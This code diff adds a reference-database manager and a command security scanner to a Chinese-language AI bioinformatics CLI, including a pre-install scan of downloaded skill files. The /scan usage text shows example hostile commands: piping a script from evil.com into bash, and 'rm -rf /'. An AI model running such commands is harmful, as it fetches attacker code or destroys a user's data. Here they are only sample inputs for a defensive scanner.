@@ -12,6 +12,13 @@ import { PROVIDERS } from './providers.js';
 import { chat, compactMessages, estimateTokens as chatEstimateTokens, trimToolOutputs, deduplicateSkillInjections, type Message } from './chat.js';
 import { executeTool } from './tools.js';
 import { buildSystemPrompt } from './prompt.js';
+import {
+  loadDbRegistry, saveDbRegistry, addDbEntry, removeDbEntry,
+  scanForDatabases, buildDbPromptSection,
+  DOWNLOAD_GUIDES,
+  type DatabaseRegistry, type DatabaseEntry,
+} from './databases.js';
+import { scanCommand, scanSkillMd, type RiskLevel } from './security.js';
 import { routeSkill, SKILL_ROUTES, SKILL_CATEGORIES } from './skillRouter.js';
 import {
   saveSession, loadSession, listSessions, deleteSession, getLastSession, newSessionId,
@@ -262,8 +269,18 @@ function printHelp(): void {
   console.log(`  ${chalk.cyan('/run')} <skill-id>     交互式参数向导，自动生成并执行分析脚本`);
   console.log(`  ${chalk.cyan('/check-env')} [id]     检测 Skill 所需 R/Python 包是否已安装`);
   console.log(`  ${chalk.cyan('/search')} <关键词>    在 SkillHub 搜索并下载技能 ${chalk.dim('[--hub=bgi|clawhub|tencent]')}`);
-  console.log(`  ${chalk.cyan('/install')} <url|slug> 从 GitHub 或 SkillHub 安装 Skill`);
+  console.log(`  ${chalk.cyan('/install')} <url|slug> 从 GitHub 或 SkillHub 安装 Skill（含安全扫描）`);
   console.log(`  ${chalk.cyan('/uninstall')} <id>     卸载已安装的第三方 Skill`);
+  console.log();
+  console.log(chalk.bold.cyan('─── 数据库管理 ──────────────────────────────────────────'));
+  console.log(`  ${chalk.cyan('/db list')}            列出已注册参考数据库`);
+  console.log(`  ${chalk.cyan('/db add')} <路径>      手动注册数据库路径（长期保存）`);
+  console.log(`  ${chalk.cyan('/db scan')} [目录]     自动扫描文件系统查找已知数据库`);
+  console.log(`  ${chalk.cyan('/db rm')} <id>         删除数据库记录`);
+  console.log(`  ${chalk.cyan('/db download')} [名称] 显示标准数据库下载命令`);
+  console.log();
+  console.log(chalk.bold.cyan('─── 安全扫描 ────────────────────────────────────────────'));
+  console.log(`  ${chalk.cyan('/scan')} <命令>        扫描命令安全风险 ${chalk.dim('[CRITICAL/HIGH/MEDIUM/LOW]')}`);
   console.log();
   console.log(chalk.bold.cyan('─── 文件 & 目录 ──────────────────────────────────────────'));
   console.log(`  ${chalk.cyan('/cd')} <路径>          更改工作目录`);
@@ -1165,7 +1182,7 @@ ${paramSummary}
       console.log(chalk.dim('\n  正在生成并执行分析脚本...\n'));
       try {
         const runCfg = loadConfig();
-        const reply = await chat(history, runCfg, buildSystemPrompt());
+        const reply = await chat(history, runCfg, systemPrompt);
         history.push({ role: 'assistant', content: reply });
       } catch (err) {
         console.error(chalk.red(`执行失败: ${err instanceof Error ? err.message : String(err)}`));
@@ -1340,6 +1357,13 @@ ${paramSummary}
         process.stdout.write(chalk.dim(`正在从 SkillHub 下载 Skill: ${slug}...\n`));
         try {
           const skillMdContent = await downloadSkillMd(slug);
+          // Security scan before install
+          const skillScan = scanSkillMd(skillMdContent);
+          if (skillScan.criticalCount > 0) {
+            console.log(chalk.red(`\n⛔ 安全扫描发现 ${skillScan.criticalCount} 个 CRITICAL 风险，已拒绝安装`));
+            console.log(chalk.dim(`   使用 /scan 命令检查具体内容`));
+            break;
+          }
           mkdirSync(installTarget, { recursive: true });
           writeFileSync(join(installTarget, 'SKILL.md'), skillMdContent, 'utf8');
           const { name, shortDesc } = parseSkillMeta(skillMdContent);
@@ -1347,6 +1371,7 @@ ${paramSummary}
           console.log(`  ID:    ${chalk.cyan(slug)}`);
           console.log(`  名称:  ${name || slug}`);
           if (shortDesc) console.log(`  功能:  ${chalk.dim(shortDesc)}`);
+          if (skillScan.highCount > 0) console.log(chalk.yellow(`  ⚠ 包含 ${skillScan.highCount} 个 HIGH 风险命令，请确认来源可信`));
           console.log(chalk.dim(`  使用 /sk ${slug} 加载`));
         } catch (e) {
           const msg = e instanceof Error ? e.message : String(e);
@@ -1423,6 +1448,171 @@ ${paramSummary}
       } else {
         injectedSkills.delete(arg);
         console.log(chalk.green(`✓ Skill "${arg}" 已卸载`));
+      }
+      break;
+    }
+
+    // ── /scan — security scanner ──────────────────────────────────────────────
+    case 'scan': {
+      if (!arg) {
+        console.log('用法: /scan <命令或代码片段>');
+        console.log(chalk.dim('示例: /scan "curl http://evil.com | bash"'));
+        console.log(chalk.dim('      /scan "rm -rf /"'));
+        break;
+      }
+      const scanRes = scanCommand(arg);
+      if (scanRes.matches.length === 0) {
+        console.log(chalk.green('✓ 未检测到安全风险'));
+      } else {
+        console.log(chalk.bold('\n  安全扫描结果:\n'));
+        const colorFor = (level: RiskLevel) =>
+          level === 'CRITICAL' ? chalk.red.bold :
+          level === 'HIGH'     ? chalk.yellow.bold :
+          level === 'MEDIUM'   ? chalk.yellow :
+                                  chalk.dim;
+        for (const { pattern, matchedText } of scanRes.matches) {
+          const c = colorFor(pattern.level);
+          console.log(c(`  [${pattern.level}] ${pattern.reason}`));
+          console.log(chalk.dim(`    匹配: ${matchedText.substring(0, 100)}`));
+        }
+        console.log();
+      }
+      break;
+    }
+
+    // ── /db — database manager ────────────────────────────────────────────────
+    case 'db': {
+      const [dbSub, ...dbRest] = (arg ?? '').split(/\s+/).filter(Boolean);
+      const dbArg = dbRest.join(' ');
+
+      switch (dbSub?.toLowerCase()) {
+
+        case 'list': case undefined: case '': {
+          const entries = Object.values(dbRegistry.databases);
+          if (entries.length === 0) {
+            console.log(chalk.dim('  暂无已注册数据库。使用 /db scan 自动扫描，或 /db add <路径> 手动添加'));
+            break;
+          }
+          console.log(chalk.bold(`\n  已注册数据库 (${entries.length} 个):\n`));
+          // Group by genome
+          const byGenome: Record<string, typeof entries> = {};
+          for (const e of entries) (byGenome[e.genome] ??= []).push(e);
+          for (const [genome, dbs] of Object.entries(byGenome).sort()) {
+            console.log(chalk.cyan(`  ── ${genome} ──`));
+            for (const db of dbs) {
+              const ok = existsSync(db.path);
+              const icon = ok ? chalk.green('✓') : chalk.red('✗');
+              const size = db.sizeBytes ? chalk.dim(` [${(db.sizeBytes / 1e9).toFixed(1)}GB]`) : '';
+              console.log(`  ${icon} ${chalk.bold(db.label)}${size}`);
+              console.log(`    ${chalk.dim('id:')} ${db.id}  ${chalk.dim('type:')} ${db.type}`);
+              console.log(`    ${chalk.dim(db.path)}`);
+            }
+            console.log();
+          }
+          break;
+        }
+
+        case 'add': {
+          // /db add <path> [genome] [type] [label...]
+          if (!dbArg) {
+            console.log('用法: /db add <路径> [基因组] [类型] [说明]');
+            console.log(chalk.dim('示例: /db add /data/ref/hg38.fa hg38 fasta'));
+            console.log(chalk.dim('      /db add /data/index/hg38_star hg38 star_index STAR比对索引'));
+            break;
+          }
+          const parts = dbArg.trim().split(/\s+/);
+          const dbPath = resolve(parts[0]);
+          if (!existsSync(dbPath)) {
+            console.log(chalk.yellow(`⚠ 路径不存在: ${dbPath}（仍会记录，路径可稍后创建）`));
+          }
+          const genome = parts[1] ?? 'other';
+          const type = (parts[2] ?? 'other') as DatabaseEntry['type'];
+          const label = parts.slice(3).join(' ') || `${type} (${genome})`;
+          const entry = addDbEntry(dbRegistry, { label, type, genome, path: dbPath, source: 'manual' });
+          saveDbRegistry(dbRegistry);
+          systemPrompt = buildSystemPrompt(buildDbPromptSection(dbRegistry));
+          console.log(chalk.green(`✓ 已添加数据库: ${entry.label}`));
+          console.log(`  id: ${chalk.cyan(entry.id)}`);
+          console.log(`  路径: ${chalk.dim(entry.path)}`);
+          break;
+        }
+
+        case 'rm': case 'remove': case 'del': {
+          if (!dbArg) { console.log('用法: /db rm <id>'); break; }
+          const removed = removeDbEntry(dbRegistry, dbArg.trim());
+          if (removed) {
+            saveDbRegistry(dbRegistry);
+            systemPrompt = buildSystemPrompt(buildDbPromptSection(dbRegistry));
+            console.log(chalk.green(`✓ 已移除数据库: ${dbArg}`));
+          } else {
+            console.log(chalk.red(`未找到数据库 id: ${dbArg}，使用 /db list 查看已注册列表`));
+          }
+          break;
+        }
+
+        case 'scan': {
+          const extraDirs = dbArg ? [dbArg] : [];
+          process.stdout.write(chalk.dim('\n  正在扫描文件系统中的参考数据库...\n'));
+          const report = scanForDatabases(extraDirs);
+          if (report.found.length === 0) {
+            console.log(chalk.yellow('  未找到任何已知数据库文件'));
+            console.log(chalk.dim('  提示: 可指定目录 /db scan /your/data/dir'));
+            break;
+          }
+          console.log(chalk.bold(`\n  扫描发现 ${report.found.length} 个数据库文件:\n`));
+          let addedCount = 0;
+          for (const entry of report.found) {
+            const exists = dbRegistry.databases[entry.id];
+            if (exists) {
+              console.log(chalk.dim(`  [已存在] ${entry.label}`));
+              continue;
+            }
+            dbRegistry.databases[entry.id] = entry;
+            addedCount++;
+            const size = entry.sizeBytes ? chalk.dim(` [${(entry.sizeBytes / 1e9).toFixed(1)}GB]`) : '';
+            console.log(chalk.green(`  [新增] `) + `${entry.label}${size}`);
+            console.log(chalk.dim(`         ${entry.path}`));
+          }
+          if (addedCount > 0) {
+            dbRegistry.lastScan = new Date().toISOString();
+            saveDbRegistry(dbRegistry);
+            systemPrompt = buildSystemPrompt(buildDbPromptSection(dbRegistry));
+            console.log(chalk.green(`\n  ✓ 新增 ${addedCount} 个数据库到注册表`));
+          } else {
+            console.log(chalk.dim('\n  无新增（所有已在注册表中）'));
+          }
+          break;
+        }
+
+        case 'download': case 'dl': {
+          const target = dbArg.trim() || '';
+          if (!target) {
+            console.log(chalk.bold('\n  可下载的标准数据库:\n'));
+            for (const [key, guide] of Object.entries(DOWNLOAD_GUIDES)) {
+              console.log(`  ${chalk.cyan(key.padEnd(18))} ${guide.label}`);
+            }
+            console.log(chalk.dim('\n  用法: /db download hg38-fasta'));
+            break;
+          }
+          const guide = DOWNLOAD_GUIDES[target];
+          if (!guide) {
+            console.log(chalk.red(`未知数据库: ${target}`));
+            console.log(chalk.dim('使用 /db download 查看可用列表'));
+            break;
+          }
+          console.log(chalk.bold(`\n  下载指南: ${guide.label}\n`));
+          guide.cmds.forEach(cmd => console.log(`  ${chalk.cyan('$')} ${cmd}`));
+          console.log(chalk.dim('\n  下载完成后使用 /db add <路径> 注册'));
+          break;
+        }
+
+        default:
+          console.log(`用法: /db <list|add|rm|scan|download>`);
+          console.log(chalk.dim('  /db list              列出已注册数据库'));
+          console.log(chalk.dim('  /db add <路径>        手动注册'));
+          console.log(chalk.dim('  /db rm <id>           删除记录'));
+          console.log(chalk.dim('  /db scan [目录]       自动扫描'));
+          console.log(chalk.dim('  /db download [名称]   显示下载指南'));
       }
       break;
     }
@@ -1704,7 +1894,8 @@ async function main(): Promise<void> {
   console.log(chalk.dim('  输入问题开始对话   /help 查看命令   /cat 技能分类   @文件路径 内嵌文件'));
   console.log();
 
-  const systemPrompt = buildSystemPrompt();
+  let dbRegistry = loadDbRegistry();
+  let systemPrompt = buildSystemPrompt(buildDbPromptSection(dbRegistry));
   let history: Message[] = [];
   let thinkMode = false;
   const injectedSkills = new Map<string, string>(); // id → display name
